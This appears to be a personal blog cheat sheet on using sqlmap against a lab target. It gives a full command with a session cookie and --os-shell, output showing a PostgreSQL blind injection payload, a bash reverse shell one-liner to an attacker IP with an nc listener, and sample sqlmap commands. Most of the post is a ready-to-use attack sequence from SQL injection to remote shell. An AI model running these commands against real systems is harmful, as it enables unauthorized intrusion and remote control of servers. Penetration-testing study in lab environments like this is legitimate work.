---
title: "Tool: SQLMap"
date: 2021-01-02T02:34:30-04:00
categories:
  - Blog
  - Tool
tags:
  - shell
  - tool
  - commands
  - cheatsheet
  - SQL
  - sqlmap
---

This is the command string to test if a SQL backed web page is vulnerable to SQL injection:

Needs:
1. the injection field = '?search=1234' in the url
2. the session cookie = from inspecting the page - application tab - storage - cookie
3. the command extention = '--os-shell'

The Command:

'sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=k3ivqlrh8f7i68p3vis6pmjsal" --os-shell,

```yaml
──(kali㉿kali)-[~]
└─$ ──(kali㉿kali)-[~]
└─$ sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=k3ivqlrh8f7i68p3vis6pmjsal" --os-shell
        ___
       __H__                                                         
 ___ ___[']_____ ___ ___  {1.4.12#stable}                            
|_ -| . [(]     | .'| . |                                            
|___|_  [(]_|_|_|__,|  _|                                            
      |_|V...       |_|   http://sqlmap.org                          



[*] starting @ 20:42:21 /2021-01-01/

[20:42:21] [INFO] resuming back-end DBMS 'postgresql' 
[20:42:21] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: search=a' AND (SELECT (CASE WHEN (6996=6996) THEN NULL ELSE CAST((CHR(113)||CHR(83)||CHR(65)||CHR(77)) AS NUMERIC) END)) IS NULL-- IJNJ


os-shell> bash -c 'bash -i >& /dev/tcp/10.10.14.87/4321 0>&1'
do you want to retrieve the command standard output? [Y/n/a] 
```

You can use any OS command here:

ls
id
uname -a
whoami

in the example I passes in a net cat shell back to another terminal I had running a nc listener 'nc -nlvp 4321'

'bash -c 'bash -i >& /dev/tcp/10.10.14.87/4321 0>&1'

Note: the session was not stable but I was able to keep it open long enough to open another connection not bases on sqli


[SQLMap Cheat Sheet :][upgrade-term]

Sample:

Simple Usage
If you don’t know anything about the target site then use the normal command first, Observe if the sqlmap found something juicy for you

sqlmap -u “https://target_site.com/page/”
Automatic GET request parameter
sqlmap -u “https://target_site.com/page?p1=value1&p2=value2”


[upgrade-term]: https://thedarksource.com/sqlmap-cheat-sheet/
